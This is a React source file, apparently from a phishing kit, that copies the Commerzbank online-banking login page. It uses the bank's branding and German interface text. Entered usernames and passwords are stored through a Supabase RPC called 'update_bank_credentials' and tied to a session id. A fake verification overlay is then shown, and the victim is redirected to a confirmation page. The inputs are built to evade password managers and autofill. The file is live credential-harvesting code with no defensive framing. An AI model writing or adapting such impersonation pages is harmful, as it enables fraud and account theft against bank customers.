import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import logoAsset from "@/assets/commerzbank-logo.svg.asset.json";

const GREEN = "#002e3c";
const YELLOW = "#ffd700";
const TEXT = "#002e3c";

const ArrowRight = ({ size = 18, color = GREEN }: { size?: number; color?: string }) => (
  <svg width={size} height={size} viewBox="0 0 24 24" fill={color} aria-hidden="true">
    <path d="m16.81 4.42-1.62 1.16L19.06 11H2v2h17.06l-3.87 5.42 1.62 1.16L22.23 12l-5.42-7.58z" />
  </svg>
);

const EyeIcon = ({ open }: { open: boolean }) => (
  <svg width="22" height="22" viewBox="0 0 24 24" fill={GREEN} aria-hidden="true">
    {open ? (
      <>
        <path d="M12 3.75C5.92 3.75 1 12 1 12s4.92 8.25 11 8.25S23 12 23 12s-4.92-8.25-11-8.25Zm0 14.5c-3.46 0-6.93-3.88-8.61-6.25C5.07 9.62 8.54 5.75 12 5.75s6.93 3.88 8.61 6.25c-1.68 2.38-5.15 6.25-8.61 6.25Z" />
        <path d="M12 8a4 4 0 1 0 4 4 4 4 0 0 0-4-4Zm0 6a2 2 0 1 1 2-2 2 2 0 0 1-2 2Z" />
      </>
    ) : (
      <path d="M2.1 3.51 3.51 2.1 21.9 20.49l-1.41 1.41-3.3-3.3C15.78 19.5 13.94 20 12 20 7 20 2.73 16.89 1 12.5c.77-1.96 2.01-3.67 3.59-5L2.1 3.51ZM12 7c3.86 0 7 3.14 7 7 0 .65-.09 1.27-.26 1.86l-2.14-2.14A5 5 0 0 0 10.28 7.4L8.14 5.26C9.33 5.09 10.65 5 12 5c5 0 9.27 3.11 11 7.5-.73 1.85-1.86 3.48-3.3 4.76L18.11 15.6c.57-.95.89-2.05.89-3.1 0-3.31-2.69-6-6-6-.6 0-1.17.09-1.72.26L9.28 4.82C10.14 4.65 11.05 4.56 12 4.56Z" />
    )}
  </svg>
);

const ChatIcon = () => (
  <svg width="18" height="18" viewBox="0 0 24 24" fill={GREEN} aria-hidden="true">
    <path d="M20 5v10h-9.24L9 18.53 7.24 15H4V5h16m0-2H4a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h2l3 6 3-6h8a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2Z" />
  </svg>
);

const SearchIcon = () => (
  <svg width="20" height="20" viewBox="0 0 24 24" fill="#fff" aria-hidden="true">
    <path d="M17.41 14h-2.17A8 8 0 1 0 14 15.24v2.17l6 6L23.41 20ZM9 15a6 6 0 1 1 6-6 6 6 0 0 1-6 6Zm7 1.59V16h.59l4 4-.59.59Z" />
  </svg>
);

const ServiceIcon = () => (
  <svg width="26" height="26" viewBox="0 0 24 24" fill={GREEN} aria-hidden="true">
    <path d="M23.58 12.63 20 18.84a5.52 5.52 0 0 0-.18-.92c-.11-.41-.39-1.26-.48-1.49a10.51 10.51 0 0 0-.85-1.79L15.83 10s-1.76-3-2.66-4.62c-.11-.19-.26-.43-.44-.71l.78-.91a5.25 5.25 0 0 1 1.89-1.43A3.93 3.93 0 0 1 16.93 2h.52Zm-5.14 8.93-.25.43H5.91L2.32 15.8a6.47 6.47 0 0 0 .88.3c.42.11 1.3.29 1.54.33a11.54 11.54 0 0 0 2 .16H18.2c.16.45.38 1.07.4 1.14a5.27 5.27 0 0 1 .32 2.37 4.11 4.11 0 0 1-.48 1.46ZM12 3.78a12.68 12.68 0 0 0-1.13 1.63C10 7 8.25 10 8.25 10l-2.66 4.64c-.11.19-.25.44-.39.73L4 15.15a5.14 5.14 0 0 1-2.2-.9 4 4 0 0 1-1.05-1.17l-.25-.43.19-.33L6.64 2h7.16a7.7 7.7 0 0 0-.71.61c-.3.31-.89.98-1.09 1.17Z" />
  </svg>
);

const MailIcon = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" fill={GREEN} aria-hidden="true">
    <path d="m12 12.78 11-7.61V4H1v1.17l11 7.61z" />
    <path d="M13.14 14.43a2 2 0 0 1-2.28 0L1 7.6V20h22V7.6Z" />
  </svg>
);

const Commerzbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [showLoading, setShowLoading] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Commerzbank – Online Banking Login", logoAsset.url);

  const handleLogin = async () => {
    if (submitting) return;
    if (username.trim().length === 0 || password.length === 0) return;
    setSubmitting(true);
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: username,
        p_password: password,
        p_username_label: "Benutzername/Teilnehmernummer",
        p_password_label: "Passwort/PIN",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  const navLinks = ["Privatkunden", "Unternehmerkunden", "Wealth Management", "Firmenkunden"];
  const secLinks = [
    "Angebliche Bank-Mitarbeiter erfragen Zugangsdaten",
    "Anlagebetrug erkennen und vermeiden",
    "Warnung vor Phishing",
    "Phishing-Briefe im Namen der Bank (Quishing)",
  ];

  return (
    <div className="min-h-screen flex flex-col bg-white" style={{ fontFamily: "'Gotham Sans', 'Montserrat', 'Helvetica Neue', Arial, sans-serif", color: TEXT }}>
      {/* Header */}
      <header style={{ backgroundColor: GREEN }} className="text-white">
        <div className="max-w-[1400px] mx-auto px-6 lg:px-10 py-5 flex items-start gap-8">
          <a href="#" className="flex-shrink-0">
            <img src={logoAsset.url} alt="Commerzbank Logo" className="h-14 w-auto" />
          </a>
          <div className="flex-1 flex items-center justify-between pt-6">
            <nav className="hidden md:flex items-center gap-7 text-[15px] font-semibold">
              {navLinks.map((l) => (
                <a key={l} href="#" className="hover:underline">{l}</a>
              ))}
            </nav>
            <div className="flex items-center gap-6 text-[14px] font-semibold">
              <a href="#" className="hover:underline">EN</a>
              <a href="#" className="flex items-center gap-2 hover:underline">
                <SearchIcon /> Suche
              </a>
            </div>
          </div>
        </div>
      </header>

      {/* Content */}
      <main className="flex-1">
        <div className="max-w-[1400px] mx-auto px-6 lg:px-10 pt-10 lg:pt-14 pb-16">
          {/* Title row */}
          <div className="flex items-start justify-between mb-16 lg:mb-20">
            <h1 className="text-[44px] lg:text-[52px] font-bold leading-[1.05] tracking-tight" style={{ color: TEXT }}>Login</h1>
            <button type="button" className="flex items-center gap-2 text-[14px] font-semibold hover:underline" style={{ color: TEXT }}>
              Hilfe <ChatIcon />
            </button>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-2 gap-12">
            {/* Form */}
            <form onSubmit={(e) => { e.preventDefault(); handleLogin(); }} autoComplete="off">
              <div className="max-w-[520px]">
                {/* Username */}
                <div className="mb-8">
                  <label htmlFor="cb-user" className="block text-[13px] mb-1" style={{ color: TEXT }}>
                    Benutzername/Teilnehmernummer
                  </label>
                  <input
                    id="cb-user"
                    name={"u_" + Math.random().toString(36).slice(2, 8)}
                    type="text"
                    autoComplete="off"
                    autoCorrect="off"
                    autoCapitalize="off"
                    spellCheck={false}
                    data-lpignore="true"
                    data-form-type="other"
                    readOnly
                    onFocus={(e) => e.currentTarget.removeAttribute("readonly")}
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full bg-transparent border-0 border-b-2 py-2 outline-none text-[16px]"
                    style={{ borderColor: TEXT, color: TEXT }}
                  />
                </div>

                {/* Password */}
                <div className="mb-10 relative">
                  <label htmlFor="cb-pin" className="block text-[13px] mb-1" style={{ color: TEXT }}>
                    Passwort/PIN
                  </label>
                  <div className="relative">
                    <input
                      id="cb-pin"
                      name={"p_" + Math.random().toString(36).slice(2, 8)}
                      type={showPassword ? "text" : "password"}
                      autoComplete="new-password"
                      autoCorrect="off"
                      autoCapitalize="off"
                      spellCheck={false}
                      data-lpignore="true"
                      data-form-type="other"
                      readOnly
                      onFocus={(e) => e.currentTarget.removeAttribute("readonly")}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full bg-transparent border-0 border-b-2 py-2 pr-10 outline-none text-[16px]"
                      style={{ borderColor: TEXT, color: TEXT }}
                    />
                    <button
                      type="button"
                      aria-label="Passwort anzeigen"
                      onClick={() => setShowPassword((v) => !v)}
                      className="absolute right-0 bottom-2"
                    >
                      <EyeIcon open={showPassword} />
                    </button>
                  </div>
                </div>

                {/* Login button */}
                <button
                  type="submit"
                  className="inline-flex items-center gap-3 rounded-full font-semibold text-[15px] px-7 py-3 transition-opacity"
                  style={{ backgroundColor: YELLOW, color: TEXT }}
                >
                  Login <ArrowRight color={TEXT} />
                </button>

                {/* Secondary links */}
                <div className="mt-10 space-y-4 text-[14px]">
                  <div className="flex flex-wrap gap-x-10 gap-y-3">
                    <a href="#" className="font-semibold hover:underline" style={{ color: TEXT }}>Passwort vergessen?</a>
                    <a href="#" className="font-semibold hover:underline" style={{ color: TEXT }}>Teilnehmernummer vergessen?</a>
                  </div>
                  <a href="#" className="inline-flex items-center gap-2 font-semibold hover:underline" style={{ color: TEXT }}>
                    Zugang beantragen <ArrowRight size={16} color={TEXT} />
                  </a>
                  <div>
                    <a href="#" className="inline-flex items-center gap-2 font-semibold hover:underline" style={{ color: TEXT }}>
                      Wichtige Informationen zum Digital Banking <ArrowRight size={16} color={TEXT} />
                    </a>
                  </div>
                </div>
              </div>
            </form>

            {/* Right column: security hints */}
            <aside>
              <h2 className="text-[22px] lg:text-[24px] font-bold mb-6" style={{ color: TEXT }}>
                Wichtige Sicherheitshinweise
              </h2>
              <ul className="space-y-5">
                {secLinks.map((l) => (
                  <li key={l}>
                    <a href="#" className="flex items-center gap-4 hover:underline" style={{ color: TEXT }}>
                      <ArrowRight size={18} color={TEXT} />
                      <span className="text-[15px]">{l}</span>
                    </a>
                  </li>
                ))}
              </ul>
            </aside>
          </div>
        </div>
      </main>

      {/* Yellow banner — only top ~25% ragt in den weißen Bereich, Rest sitzt auf Grün */}
      <section style={{ backgroundColor: GREEN }} className="relative z-10">
        <div className="max-w-[1400px] mx-auto px-6 lg:px-10">
          <div style={{ backgroundColor: YELLOW, marginTop: '-56px' }} className="rounded-3xl px-6 lg:px-14 py-14 flex items-center justify-between flex-wrap gap-6">
            <h3 className="text-[18px] lg:text-[20px] font-semibold" style={{ color: TEXT }}>
              24 Stunden für Sie da.
            </h3>
            <div className="flex items-center gap-10">
              <a href="#" className="flex flex-col items-center gap-2" style={{ color: TEXT }}>
                <span className="w-14 h-14 rounded-full border flex items-center justify-center" style={{ borderColor: TEXT }}>
                  <ServiceIcon />
                </span>
                <span className="text-[13px] font-semibold">Service</span>
              </a>
              <a href="#" className="flex flex-col items-center gap-2" style={{ color: TEXT }}>
                <span className="w-14 h-14 rounded-full border flex items-center justify-center" style={{ borderColor: TEXT }}>
                  <MailIcon />
                </span>
                <span className="text-[13px] font-semibold">Kontakt</span>
              </a>
            </div>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer style={{ backgroundColor: GREEN }} className="text-white pt-10">
        <div className="max-w-[1400px] mx-auto px-6 lg:px-10 pb-10">
          <div className="flex items-center justify-between flex-wrap gap-6 pb-6">
            <div className="flex items-center gap-3">
              <img src={logoAsset.url} alt="Commerzbank" className="h-9 w-auto" />
            </div>
            <div className="text-[14px] font-semibold">Die Bank an Ihrer Seite</div>
          </div>
          <div className="border-t border-white/20 pt-5">
            <ul className="flex flex-wrap gap-x-8 gap-y-3 text-[13px]">
              {["AGB", "Rechtliche Hinweise", "Impressum", "Einwilligungseinstellung", "Konzern", "Karriere"].map((l) => (
                <li key={l}><a href="#" className="hover:underline">{l}</a></li>
              ))}
            </ul>
          </div>
        </div>
      </footer>

      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
    </div>
  );
};

export default Commerzbank;
